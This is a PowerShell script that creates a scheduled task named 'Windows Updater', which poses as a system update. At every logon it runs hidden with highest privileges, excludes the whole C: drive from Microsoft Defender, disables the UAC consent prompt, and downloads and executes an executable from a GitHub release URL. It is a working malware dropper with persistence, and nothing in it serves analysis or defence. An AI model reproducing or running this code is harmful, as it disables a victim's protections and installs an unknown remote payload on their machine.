$taskName = "Windows Updater"

# Check if the task exists
$existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue

if ($existingTask -eq $null) {
    Write-Host "Task '$taskName' does not exist. Creating and running the task."

    $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -command "Add-MpPreference -ExclusionPath \"C:\";
    Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0;
    $url = \"https://github.com/AhmedK97/Xwqd21WaDdqwdv/releases/download/1.0/Server.exe\";
    $downloadsFolder = [Environment]::GetFolderPath(\"User\");
    $outputPath = Join-Path -Path $downloadsFolder -ChildPath \"RunExclusion.exe\";
    Invoke-WebRequest -Uri $url -OutFile $outputPath;
    while ((Test-Path -Path $outputPath) -eq $false) {
    Start-Sleep -Seconds 1
    };
    Start-Process -FilePath $outputPath -NoNewWindow"'

    $Trigger = New-ScheduledTaskTrigger -AtLogon
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

    # Register the scheduled task
    Register-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings -TaskName $taskName

    # Get the task
    $task = Get-ScheduledTask -TaskName $taskName

    # Modify the task settings
    $taskPrincipal = $task.Principal
    $taskPrincipal.RunLevel = 1 # Highest
    $task.Principal = $taskPrincipal

    # Update the task with modified settings
    Set-ScheduledTask -TaskName $taskName -TaskPath $task.TaskPath -Principal $taskPrincipal
    Write-Host "Task '$taskName' has been modified to RunLevel Highest."

    # Start the modified task
    Start-ScheduledTask -TaskName $taskName
}
else {
    Write-Host "Task '$taskName' already exists. Starting the existing task."
    Start-ScheduledTask -TaskName $taskName
}
